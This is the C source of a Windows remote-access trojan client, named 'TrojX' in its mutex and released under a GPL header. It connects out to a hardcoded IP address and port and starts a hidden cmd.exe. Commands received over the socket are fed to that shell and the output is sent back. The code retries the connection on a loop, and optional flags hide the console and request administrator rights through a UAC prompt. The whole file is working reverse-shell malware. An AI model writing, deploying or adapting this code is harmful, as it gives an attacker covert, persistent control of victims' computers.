/*
 * 
 * description and author required here
 * 
 * 
 * 
 * Copyright (C) 2016 93aef0ce4dd141ece6f5
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */

#define _WIN32_WINNT  0x501
#define MAX_MSG_SIZE 4096

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winsock2.h>

// client options
#define DEBUG
//#define RUN_AS_ADMIN
//#define STEALTH

#define DTOR __attribute__((destructor))

#define MUTEX_VAL "TrojX"

// target options
#define TARGET_IP "27.253.116.172"
#define TARGET_PORT "6969"

#define MINUTE 60*1000

enum {
    WINDOWS,
    POSIX
};

SOCKET s;

DTOR void dStructor (void) {
    if (shutdown (s, SD_BOTH) != 0) {
        fprintf (stderr, "Shutdown error: %d\n", (int)WSAGetLastError());
    }
    closesocket (s);
    WSACleanup();
}

void nonFatal (char *str, int type) {
    #ifdef DEBUG
    if (type == WINDOWS) {
        int err = 0;
        if ((err = (int)GetLastError())) {
            fprintf (stderr, "[!] %s error: %d\n", str, err);
        }
    } else if (type == POSIX) {
        perror (str);
    }
    #endif
}

void fatal (char *str, int type) {
    #ifdef DEBUG
    if (type == WINDOWS) {
        int err = 0;
        if ((err = (int)GetLastError())) {
            fprintf (stderr, "[!] %s error: %d\n", str, err);
        }
    } else if (type == POSIX) {
        perror (str);
    }
    #endif
    exit (EXIT_FAILURE);
}

void startConnexion (char *addr, char *port) {
    WSADATA wsa;
    int err;

    struct addrinfo hints, *res;
    memset (&hints, 0, sizeof (hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    err = WSAStartup (MAKEWORD (2, 2), &wsa);
    if (err) {
        fatal ("WSA Startup", WINDOWS);
    }
    
    int gai = getaddrinfo (addr, port, &hints, &res);
    if (gai) {
        fprintf (stderr, "[!] Get Info Error: %s\n", gai_strerror (gai));
        exit (EXIT_FAILURE);
    }
    
    s = socket (res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) {
        fatal ("Socket", WINDOWS);
    }

    do {
        err = connect (s, res->ai_addr, res->ai_addrlen);
        if (err) {
            Sleep (5*MINUTE);
        }
    } while (err);

    freeaddrinfo (res);
}

void startReceiver (void) {
    int recvStat;
    DWORD nWritten = 0, nRead = 0;
    HANDLE stdIn, stdOut, stdErr, stdInWrite, stdOutRead, stdErrRead;

    char input[MAX_MSG_SIZE+7];
    char output[MAX_MSG_SIZE+7];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;

    memset (&si, 0, sizeof (si));
    memset (&pi, 0, sizeof (pi));
    memset (&sa, 0, sizeof (sa));

    si.cb = sizeof (si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    sa.nLength = sizeof (sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;

    // create read and write pipes to new cmd process
    if (!CreatePipe (&stdIn, &stdInWrite, &sa, 0)) {
        nonFatal ("Create stdin pipe", WINDOWS);
        return;
    }

    if (!SetHandleInformation (stdInWrite, HANDLE_FLAG_INHERIT, 0)) {
        nonFatal ("Set stdin handle", WINDOWS);
        return; 
    }

    if (!CreatePipe (&stdOutRead, &stdOut, &sa, 0)) {
        nonFatal ("Create stdout pipe", WINDOWS);
        return;
    }

    if (!SetHandleInformation (stdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        nonFatal ("Set stdout handle", WINDOWS);
        return; 
    }

    if (!CreatePipe (&stdErrRead, &stdErr, &sa, 0)) {
        printf ("Error: CreatePipe: %d\n", (int)GetLastError());
        return;
    }

    if (!SetHandleInformation (stdErrRead, HANDLE_FLAG_INHERIT, 0)) {
        printf ("Error: Set stdErrRead Info: %d\n", (int)GetLastError());
        return; 
    }

    si.hStdInput = stdIn;
    si.hStdOutput = stdOut;
    si.hStdError = stdErr;

    // create cmd process
    if (!CreateProcess ("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, TRUE, 
                        CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        nonFatal ("Create process", WINDOWS);
        CloseHandle (stdIn);
        CloseHandle (stdOut);
        CloseHandle (stdErr);
        CloseHandle (stdInWrite);
        CloseHandle (stdOutRead);
        CloseHandle (stdErrRead);
        return;
    }

    if (!pi.hProcess) {
        fatal ("Process not created", WINDOWS);
        //return;
    }

    puts ("Receiving...");
    // start receiving
    do {
        //memset (output, 0, MAX_MSG_SIZE);
        int stdErrFlag = 0;
        do {
            Sleep (100);

            memset (output, 0, MAX_MSG_SIZE);
            puts ("Peek StdErr Pipe");
            PeekNamedPipe (stdErrRead, output, MAX_MSG_SIZE-1, &nRead, NULL, NULL);
            if (nRead > 0) {
                puts ("StdErr has content");
                stdErrFlag = 1;
                puts ("Read File");
                if (ReadFile (stdErrRead, output, MAX_MSG_SIZE-1, &nRead, NULL)) {
                    if (send (s, output+strlen (input)-1, strlen (output)-strlen (input)+1, 0) == SOCKET_ERROR) {
                        nonFatal ("Send", WINDOWS);
                        //return;
                    }
                } else {
                    nonFatal ("Read StdErr Pipe", WINDOWS);
                }
            } else {
                Sleep (100);
            }

            do {
                memset (output, 0, MAX_MSG_SIZE);
                puts ("Peek Stdout Pipe");
                PeekNamedPipe (stdOutRead, output, MAX_MSG_SIZE-1, &nRead, NULL, NULL);
                if (nRead > 0) {
                    puts ("Read File");
                    if (ReadFile (stdOutRead, output, MAX_MSG_SIZE-1, &nRead, NULL)) {
                        if (send (s, output+strlen (input)-1, strlen (output)-strlen (input)+1, 0) == SOCKET_ERROR) {
                            nonFatal ("Send", WINDOWS);
                            //return;
                        }
                    } else {
                        nonFatal ("Read Stdout Pipe", WINDOWS);
                    }
                } else {
                    Sleep (100);
                }
            } while (nRead);

            stdErrFlag = 0;

        } while (stdErrFlag);

        int ping = 0;
        do {
            memset (input, 0, MAX_MSG_SIZE);

            recvStat = recv (s, input, MAX_MSG_SIZE-8, 0);
            if (recvStat == SOCKET_ERROR) {
                int err = WSAGetLastError();
                DisconnectNamedPipe (stdIn);
                CloseHandle (stdIn);
                DisconnectNamedPipe (stdOut);
                CloseHandle (stdOut);
                DisconnectNamedPipe (stdErr);
                CloseHandle (stdErr);
                CloseHandle (stdInWrite);
                CloseHandle (stdOutRead);
                CloseHandle (stdErrRead);
                //        aborted connexion             timed out             connexion reset
                // restart connexion
                if (err == WSAECONNABORTED || err == WSAETIMEDOUT || err == WSAECONNRESET) {
                    return;
                } else {
                    fatal ("Receive", WINDOWS);
                }
            }

            // receieve heartbeat
            if (!strncmp (input, "PING", 4)) {
                ping = 1;
            } else if (!strncmp (input, "exit", 4)) {
                exit (EXIT_SUCCESS);
            } else {
                ping = 0;
                // write to cmd pipe
                puts ("Write File");
                //if (strlen (input) > 1) {
                    if (!WriteFile (stdInWrite, input, strlen (input), &nWritten, NULL)) {
                        nonFatal ("Write to input", WINDOWS);
                        //return;
                    }
                //}
            }
        } while (ping);
    } while (TRUE);

    DisconnectNamedPipe (stdIn);
    CloseHandle (stdIn);
    DisconnectNamedPipe (stdOut);
    CloseHandle (stdOut);
    DisconnectNamedPipe (stdErr);
    CloseHandle (stdErr);
    CloseHandle (stdInWrite);
    CloseHandle (stdOutRead);
    CloseHandle (stdErrRead);
}

int main (int argc, char *argv[]) {
    // run as admin
    #ifdef RUN_AS_ADMIN
    if (argc < 2 || (argc > 1 && strncmp (argv[1], "admin", 5))) {
        LPSHELLEXECUTEINFO pExecInfo = malloc (sizeof (*pExecInfo));
        memset (pExecInfo, 0, sizeof (*pExecInfo));
        pExecInfo->cbSize = sizeof (*pExecInfo);
        pExecInfo->lpVerb = "runas";
        pExecInfo->lpFile = argv[0];
        pExecInfo->lpParameters = "admin";

        // rerun program with UAC prompt
        ShellExecuteEx (pExecInfo);

        if (!pExecInfo->hProcess) {
            free (pExecInfo);
            fatal ("Admin process", WINDOWS);
        }

        free (pExecInfo);
        exit (EXIT_SUCCESS);
    }
    #endif

    // hide window
    #ifdef STEALTH
    AllocConsole ();
    ShowWindow (FindWindowA ("ConsoleWindowClass", NULL), SW_HIDE);
    #endif

    // create mutex
    CreateMutex (NULL, FALSE, MUTEX_VAL);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        exit (EXIT_FAILURE);
    }

    // create connexion and start listening for server
    while (TRUE) {
        startConnexion (TARGET_IP, TARGET_PORT);
        startReceiver();
        closesocket (s);
        WSACleanup();
        Sleep (10*MINUTE);
    }

    return EXIT_SUCCESS;
}
